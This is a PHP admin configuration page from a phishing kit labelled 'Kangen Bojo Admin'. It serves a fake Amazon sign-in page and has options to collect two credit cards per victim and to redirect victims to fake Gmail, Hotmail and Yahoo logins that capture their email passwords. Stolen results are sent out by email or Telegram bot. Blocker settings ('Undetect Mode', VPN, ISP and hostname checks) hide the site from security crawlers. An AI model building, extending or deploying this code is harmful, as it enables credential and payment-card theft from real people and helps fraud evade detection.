<?php
require '../includes/config.php';
require '../includes/functions.php';

if(!isset($_SESSION['license'])) header('Location: index.php');

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $errors = [];

    // Raw inputs
    $public_site_url = trim($_POST['public_site_url'] ?? '');
    $signin_path = trim($_POST['signin_path'] ?? 'login.php');
    $admin_path = trim($_POST['admin_path'] ?? 'admin/');

    // Validate public_site_url (allow empty)
    if ($public_site_url !== '') {
        if (!filter_var($public_site_url, FILTER_VALIDATE_URL)) {
            $errors[] = 'Public Site Base URL is not a valid URL.';
        }
    }

    // Validate paths: allow filenames or path segments, no scheme
    $pathPattern = '/^[\/\w\-\.]+$/';
    if ($signin_path !== '' && !preg_match($pathPattern, $signin_path)) {
        $errors[] = 'Signin Path contains invalid characters.';
    }
    if ($admin_path !== '' && !preg_match($pathPattern, $admin_path)) {
        $errors[] = 'Admin Path contains invalid characters.';
    }

    if (count($errors) === 0) {
        // Normalize paths: remove leading/trailing spaces and ensure no accidental protocol in paths
        $signin_path = trim($signin_path);
        $admin_path = trim($admin_path);

        $config_data = [
            // Public site configuration
            'public_site_url' => $public_site_url,
            'signin_path' => $signin_path,
            'admin_path' => $admin_path,
            'email_result' => $_POST['email_result'],
            'telegram_token' => $_POST['telegram_token'],
            'telegram_chat_id' => $_POST['telegram_chat_id'],
            'double_cc' => isset($_POST['double_cc']),
            'get_email_access' => isset($_POST['get_email_access']),
            'encryption_method' => $_POST['encryption_method'],
            'blocker_settings' => [
                'stopbot' => isset($_POST['stopbot']),
                'undetect' => isset($_POST['undetect']),
                'botblocker' => isset($_POST['botblocker']),
                'user_agent' => isset($_POST['user_agent']),
                'hostname' => isset($_POST['hostname']),
                'ip_range' => isset($_POST['ip_range']),
                'isp' => isset($_POST['isp']),
                'proxy_port' => isset($_POST['proxy_port']),
                'dns' => isset($_POST['dns']),
                'vpn' => isset($_POST['vpn']),
                'one_time' => isset($_POST['one_time'])
            ],
            'sending_methods' => [
                'email' => isset($_POST['email']),
                'telegram' => isset($_POST['telegram'])
            ]
        ];

        $json_config = json_encode($config_data);
        $conn->query("UPDATE settings SET config_data = '".$conn->real_escape_string($json_config)."'");
        header("Location: config.php?success=1");
        exit;
    } else {
        // keep $config as-is and show errors below the form
        $save_error = implode(' ', $errors);
    }
}

$result = $conn->query("SELECT * FROM settings LIMIT 1");
$current_config = $result->fetch_assoc();
$config = json_decode($current_config['config_data'], true);
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Configuration - Kangen Bojo Admin Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        /* Matrix Rain Effect Background */
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.15;
        }

        /* Animated Grid Background */
        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            animation: gridMove 20s linear infinite;
            z-index: 0;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(50px, 50px); }
        }

        /* Glowing Orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.2;
            animation: float 15s infinite ease-in-out;
            z-index: 0;
        }

        .orb1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(135deg, #00ff41, #00d4ff);
            top: -200px;
            left: -200px;
        }

        .orb2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            bottom: -150px;
            right: -150px;
            animation-delay: 2s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -30px) scale(1.1); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 10;
        }

        header {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(20px);
            padding: 25px 30px;
            border-radius: 15px;
            margin-bottom: 30px;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.5),
                0 0 40px rgba(0, 255, 65, 0.1),
                inset 0 0 20px rgba(0, 255, 65, 0.05);
            border: 1px solid rgba(0, 255, 65, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 20px;
        }

        h1 {
            color: #00ff41;
            font-size: 28px;
            font-weight: 700;
            text-shadow: 
                0 0 10px rgba(0, 255, 65, 0.5),
                0 0 20px rgba(0, 255, 65, 0.3);
            letter-spacing: 2px;
        }

        .nav-links {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }

        .nav-links a {
            color: #00ff41;
            text-decoration: none;
            padding: 10px 18px;
            border-radius: 8px;
            transition: all 0.3s;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: 1px solid rgba(0, 255, 65, 0.2);
            background: rgba(0, 255, 65, 0.05);
        }

        .nav-links a:hover {
            background: rgba(0, 255, 65, 0.2);
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
            transform: translateY(-2px);
        }

        .nav-links a.active {
            background: linear-gradient(135deg, #00ff41, #00d4ff);
            color: #0a0e27;
            border-color: transparent;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
        }

        .success-alert {
            background: rgba(0, 255, 65, 0.1);
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: none;
            animation: slideDown 0.3s ease-out;
        }

        .success-alert.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .config-container {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(20px);
            padding: 40px;
            border-radius: 15px;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.5),
                0 0 40px rgba(0, 255, 65, 0.1);
            border: 1px solid rgba(0, 255, 65, 0.3);
        }

        .page-title {
            color: #00ff41;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 3px solid #00ff41;
            text-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
            letter-spacing: 2px;
            text-transform: uppercase;
        }

        .section {
            margin-bottom: 40px;
        }

        .section-title {
            color: #00d4ff;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .section-title::before {
            content: '▶';
            color: #00ff41;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            color: #00ff41;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            padding: 12px;
            background: rgba(0, 255, 65, 0.05);
            border-radius: 8px;
            border: 1px solid rgba(0, 255, 65, 0.2);
        }

        .checkbox-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 10px;
        }

        input[type="checkbox"] {
            width: 20px;
            height: 20px;
            cursor: pointer;
            accent-color: #00ff41;
        }

        input[type="text"],
        input[type="email"],
        textarea,
        select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid rgba(0, 255, 65, 0.3);
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
            background: rgba(0, 0, 0, 0.4);
            color: #00ff41;
            font-family: 'Courier New', monospace;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        textarea:focus,
        select:focus {
            outline: none;
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
            background: rgba(0, 0, 0, 0.6);
        }

        input::placeholder,
        textarea::placeholder {
            color: rgba(0, 255, 65, 0.4);
        }

        select option {
            background: #0a0e27;
            color: #00ff41;
        }

        textarea {
            min-height: 100px;
            resize: vertical;
        }

        .input-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .save-btn {
            background: linear-gradient(135deg, #00ff41, #00d4ff);
            color: #0a0e27;
            border: none;
            padding: 15px 40px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
        }

        .save-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 40px rgba(0, 255, 65, 0.6);
        }

        .info-box {
            background: rgba(0, 212, 255, 0.1);
            border-left: 4px solid #00d4ff;
            padding: 12px;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 11px;
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }

        .card {
            background: rgba(0, 255, 65, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 65, 0.2);
        }

        /* Particles */
        .particle {
            position: fixed;
            width: 2px;
            height: 2px;
            background: #00ff41;
            border-radius: 50%;
            animation: particle 10s linear infinite;
            opacity: 0;
            z-index: 0;
        }

        @keyframes particle {
            0% {
                transform: translateY(100vh) translateX(0);
                opacity: 0;
            }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% {
                transform: translateY(-100vh) translateX(100px);
                opacity: 0;
            }
        }

        @media (max-width: 768px) {
            .input-group {
                grid-template-columns: 1fr;
            }

            .checkbox-grid {
                grid-template-columns: 1fr;
            }

            .config-container {
                padding: 25px;
            }

            .page-title {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <!-- Background Effects -->
    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
    <div class="grid-bg"></div>
    
    <!-- Glowing Orbs -->
    <div class="orb orb1"></div>
    <div class="orb orb2"></div>

    <!-- Particles -->
    <script>
        for(let i = 0; i < 15; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDelay = Math.random() * 10 + 's';
            particle.style.animationDuration = (Math.random() * 5 + 8) + 's';
            document.body.appendChild(particle);
        }
    </script>

    <div class="container">
        <header>
            <h1>⚡ KANGEN BOJO ADMIN</h1>
                <nav class="nav-links">
                <a href="dashboard.php">Dashboard</a>
                <a href="config.php" class="active">Site Configuration</a>
                <?php
                    $viewSite = ($config['public_site_url'] ?? '');
                    $signin = ($config['signin_path'] ?? 'login.php');
                    if ($viewSite) {
                        $fullView = rtrim($viewSite, '/') . '/' . ltrim($signin, '/');
                        echo '<a href="' . htmlspecialchars($fullView) . '" target="_blank">View Site</a>';
                    } else {
                        echo '<a href="../index.php" target="_blank">View Site</a>';
                    }
                ?>
                <a href="logout.php">Logout</a>
            </nav>
        </header>

        <div class="config-container">
            <div class="success-alert" id="successAlert">
                ✓ Configuration saved successfully!
            </div>
            <div class="success-alert" id="errorAlert" style="background: rgba(239,68,68,0.1); border-color: #ef4444; color: #ef4444; display: none;">
                <span id="errorText"></span>
            </div>

            <h2 class="page-title">⚙ Site Configuration</h2>

            <form method="POST" action="config.php">
                <!-- Country lock / language detection removed -->

                <!-- Data Collection Settings -->
                <div class="section">
                    <h3 class="section-title">💳 Data Collection Features</h3>
                    
                    <div class="card">
                        <div class="checkbox-group">
                            <input type="checkbox" id="double_cc" name="double_cc" <?php echo ($config['double_cc'] ?? false) ? 'checked' : ''; ?>>
                            <label for="double_cc" class="form-label" style="margin: 0;">Enable Double CC (Request 2 Credit Cards)</label>
                        </div>
                        
                        <div class="form-group">
                            <p style="font-size: 12px; color: #888; margin-top: 5px;">When enabled, visitors will be asked to provide a backup credit card after the first card.</p>
                        </div>

                        <div class="checkbox-group">
                            <input type="checkbox" id="get_email_access" name="get_email_access" <?php echo ($config['get_email_access'] ?? false) ? 'checked' : ''; ?>>
                            <label for="get_email_access" class="form-label" style="margin: 0;">Get Email Provider Access (Fake Hotmail/Gmail/Yahoo Login)</label>
                        </div>
                        
                        <div class="form-group">
                            <p style="font-size: 12px; color: #888; margin-top: 5px;">When enabled, after Amazon login, visitors will be redirected to a fake email provider login page (Gmail/Hotmail/Yahoo based on their email). This captures their email provider password and optional recovery info.</p>
                        </div>
                    </div>
                </div>

                <!-- Blocker Settings -->
                <div class="section">
                    <h3 class="section-title">Blocker Configuration</h3>
                    
                    <div class="card">
                        <div class="checkbox-grid">
                            <div class="checkbox-group">
                                <input type="checkbox" id="stopbot" name="stopbot" <?php echo ($config['blocker_settings']['stopbot'] ?? false) ? 'checked' : ''; ?>>
                                <label for="stopbot" class="form-label" style="margin: 0;">Stop Bot</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="undetect" name="undetect" <?php echo ($config['blocker_settings']['undetect'] ?? false) ? 'checked' : ''; ?>>
                                <label for="undetect" class="form-label" style="margin: 0;">Undetect Mode</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="botblocker" name="botblocker" <?php echo ($config['blocker_settings']['botblocker'] ?? false) ? 'checked' : ''; ?>>
                                <label for="botblocker" class="form-label" style="margin: 0;">Bot Blocker</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="user_agent" name="user_agent" <?php echo ($config['blocker_settings']['user_agent'] ?? false) ? 'checked' : ''; ?>>
                                <label for="user_agent" class="form-label" style="margin: 0;">User Agent Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="hostname" name="hostname" <?php echo ($config['blocker_settings']['hostname'] ?? false) ? 'checked' : ''; ?>>
                                <label for="hostname" class="form-label" style="margin: 0;">Hostname Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="ip_range" name="ip_range" <?php echo ($config['blocker_settings']['ip_range'] ?? false) ? 'checked' : ''; ?>>
                                <label for="ip_range" class="form-label" style="margin: 0;">IP Range Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="isp" name="isp" <?php echo ($config['blocker_settings']['isp'] ?? false) ? 'checked' : ''; ?>>
                                <label for="isp" class="form-label" style="margin: 0;">ISP Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="proxy_port" name="proxy_port" <?php echo ($config['blocker_settings']['proxy_port'] ?? false) ? 'checked' : ''; ?>>
                                <label for="proxy_port" class="form-label" style="margin: 0;">Proxy Port Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="dns" name="dns" <?php echo ($config['blocker_settings']['dns'] ?? false) ? 'checked' : ''; ?>>
                                <label for="dns" class="form-label" style="margin: 0;">DNS Check</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="vpn" name="vpn" <?php echo ($config['blocker_settings']['vpn'] ?? false) ? 'checked' : ''; ?>>
                                <label for="vpn" class="form-label" style="margin: 0;">VPN Detection</label>
                            </div>

                            <div class="checkbox-group">
                                <input type="checkbox" id="one_time" name="one_time" <?php echo ($config['blocker_settings']['one_time'] ?? false) ? 'checked' : ''; ?>>
                                <label for="one_time" class="form-label" style="margin: 0;">One Time Access</label>
                            </div>
                        </div>
                        <div class="info-box">
                            ⓘ Enable advanced bot detection methods. Multiple checks provide better security but may affect legitimate users.
                        </div>
                    </div>
                </div>

                <!-- Encryption Method -->
                <div class="section">
                    <h3 class="section-title">Encryption Settings</h3>
                    
                    <div class="form-group">
                        <label for="encryption_method" class="form-label">Encryption Method</label>
                        <select id="encryption_method" name="encryption_method">
                            <option value="none" <?= ($config['encryption_method'] ?? 'none')=='none'?'selected':'' ?>>None</option>
                      <option value="md5" <?= ($config['encryption_method'] ?? 'none')=='md5'?'selected':'' ?>>MD5</option>
                      <option value="base64" <?= ($config['encryption_method'] ?? 'none')=='base64'?'selected':'' ?>>Base64</option>
                      <option value="hex" <?= ($config['encryption_method'] ?? 'none')=='hex'?'selected':'' ?>>Hex</option>
                      <option value="xor" <?= ($config['encryption_method'] ?? 'none')=='xor'?'selected':'' ?>>XOR</option>
                      <option value="rot13" <?= ($config['encryption_method'] ?? 'none')=='rot13'?'selected':'' ?>>ROT13</option>
                      <option value="rc4" <?= ($config['encryption_method'] ?? 'none')=='rc4'?'selected':'' ?>>RC4</option>
                      <option value="reverse" <?= ($config['encryption_method'] ?? 'none')=='reverse'?'selected':'' ?>>Reverse</option>
                        </select>
                        <div class="info-box">
                            ⓘ Select encryption method for sensitive data transmission.
                        </div>
                    </div>
                </div>

                <!-- Sending Configuration -->
                <div class="section">
                    <h3 class="section-title">Notification Settings</h3>
                    
                    <div class="card">
                        <div class="checkbox-group">
                            <input type="checkbox" id="email" name="email" <?php echo ($config['sending_methods']['email'] ?? false) ? 'checked' : ''; ?>>
                            <label for="email" class="form-label" style="margin: 0;">Enable Email Notifications</label>
                        </div>

                        <div class="form-group">
                            <label for="email_result" class="form-label">Email Result Address</label>
                            <input type="email" id="email_result" name="email_result" placeholder="admin@example.com" value="<?php echo htmlspecialchars($config['email_result'] ?? ''); ?>">
                        </div>

                        <div class="checkbox-group">
                            <input type="checkbox" id="telegram" name="telegram" <?php echo ($config['sending_methods']['telegram'] ?? false) ? 'checked' : ''; ?>>
                            <label for="telegram" class="form-label" style="margin: 0;">Enable Telegram Notifications</label>
                        </div>

                        <div class="input-group">
                            <div class="form-group">
                                <label for="telegram_token" class="form-label">Telegram Bot Token</label>
                                <input type="text" id="telegram_token" name="telegram_token" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz" value="<?php echo htmlspecialchars($config['telegram_token'] ?? ''); ?>">
                            </div>

                            <div class="form-group">
                                <label for="telegram_chat_id" class="form-label">Telegram Chat ID</label>
                                <input type="text" id="telegram_chat_id" name="telegram_chat_id" placeholder="-1001234567890" value="<?php echo htmlspecialchars($config['telegram_chat_id'] ?? ''); ?>">
                            </div>
                        </div>

                        <div class="info-box">
                            ⓘ Get your Telegram Bot Token from @BotFather and Chat ID from @userinfobot
                        </div>
                    </div>
                </div>
                
                <!-- Public Site Settings -->
                <div class="section">
                    <h3 class="section-title">🌍 Public Site & Paths</h3>
                    <div class="card">
                        <div class="form-group">
                            <label for="public_site_url" class="form-label">Public Site Base URL</label>
                            <input type="text" id="public_site_url" name="public_site_url" placeholder="https://domainsaya.com" value="<?php echo htmlspecialchars($config['public_site_url'] ?? ''); ?>">
                            <div class="info-box">ⓘ Example: <code>https://domainsaya.com</code>. Used for "View Site" link and building signin/admin URLs.</div>
                        </div>

                        <div class="form-group">
                            <label for="signin_path" class="form-label">Signin Path</label>
                            <input type="text" id="signin_path" name="signin_path" placeholder="/signin or /login.php" value="<?php echo htmlspecialchars($config['signin_path'] ?? 'login.php'); ?>">
                            <div class="info-box">ⓘ Path on your public domain that should point to the Amazon login page (e.g. <code>/signin</code> or <code>/login.php</code>).</div>
                        </div>

                        <div class="form-group">
                            <label for="admin_path" class="form-label">Admin Path</label>
                            <input type="text" id="admin_path" name="admin_path" placeholder="/admin or /panel" value="<?php echo htmlspecialchars($config['admin_path'] ?? 'admin/'); ?>">
                            <div class="info-box">ⓘ Path on your public domain for the admin panel (e.g. <code>/admin</code>). Useful for generating full admin links.</div>
                        </div>
                    </div>
                </div>

                <button type="submit" class="save-btn">💾 Save Configuration</button>
            </form>
        </div>
    </div>

    <script>
        // Matrix Rain Effect
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];

        for (let i = 0; i < columns; i++) {
            drops[i] = Math.random() * -100;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 50);

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // Show success alert if redirected with success parameter
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('success') === '1') {
            const alert = document.getElementById('successAlert');
            alert.classList.add('show');
            setTimeout(() => {
                alert.classList.remove('show');
            }, 3000);
        }

        // Toggle dependencies
        document.getElementById('telegram').addEventListener('change', function() {
            const telegramInputs = document.querySelectorAll('#telegram_token, #telegram_chat_id');
            telegramInputs.forEach(input => {
                input.disabled = !this.checked;
                input.style.opacity = this.checked ? '1' : '0.5';
            });
        });

        document.getElementById('email').addEventListener('change', function() {
            const emailInput = document.getElementById('email_result');
            emailInput.disabled = !this.checked;
            emailInput.style.opacity = this.checked ? '1' : '0.5';
        });

        // Initialize states on page load
        document.getElementById('telegram').dispatchEvent(new Event('change'));
        document.getElementById('email').dispatchEvent(new Event('change'));

        // Show error if server-side validation failed
        <?php if(!empty($save_error)): ?>
            document.getElementById('errorText').textContent = <?php echo json_encode($save_error); ?>;
            document.getElementById('errorAlert').classList.add('show');
            setTimeout(() => { document.getElementById('errorAlert').classList.remove('show'); }, 6000);
        <?php endif; ?>

        // Client-side preview & validation for Public Site URL and Paths
        const publicInput = document.getElementById('public_site_url');
        const signinInput = document.getElementById('signin_path');
        const adminInput = document.getElementById('admin_path');

        function buildPreview() {
            const base = publicInput.value.trim();
            const signin = signinInput.value.trim();
            const previewEl = document.getElementById('previewLink');
            if (!base) {
                previewEl.textContent = 'Preview: (not set)';
                return;
            }
            const cleanBase = base.replace(/\/+$/, '');
            const cleanSignin = signin.replace(/^\/+/, '');
            previewEl.textContent = 'Preview: ' + cleanBase + '/' + cleanSignin;
        }

        // Simple client validation on submit
        document.querySelector('form').addEventListener('submit', function(e) {
            const errors = [];
            const base = publicInput.value.trim();
            if (base && !/^https?:\/\//i.test(base)) {
                errors.push('Public Site Base URL should start with http:// or https://');
            }
            const pathPattern = /^[\/\w\-\.]+$/;
            if (signinInput.value.trim() && !pathPattern.test(signinInput.value.trim())) {
                errors.push('Signin Path contains invalid characters');
            }
            if (adminInput.value.trim() && !pathPattern.test(adminInput.value.trim())) {
                errors.push('Admin Path contains invalid characters');
            }
            if (errors.length) {
                e.preventDefault();
                document.getElementById('errorText').textContent = errors.join('; ');
                document.getElementById('errorAlert').classList.add('show');
                setTimeout(() => { document.getElementById('errorAlert').classList.remove('show'); }, 6000);
                return false;
            }
        });

        // Live preview updates
        publicInput && publicInput.addEventListener('input', buildPreview);
        signinInput && signinInput.addEventListener('input', buildPreview);
        buildPreview();
    </script>
</body>
</html>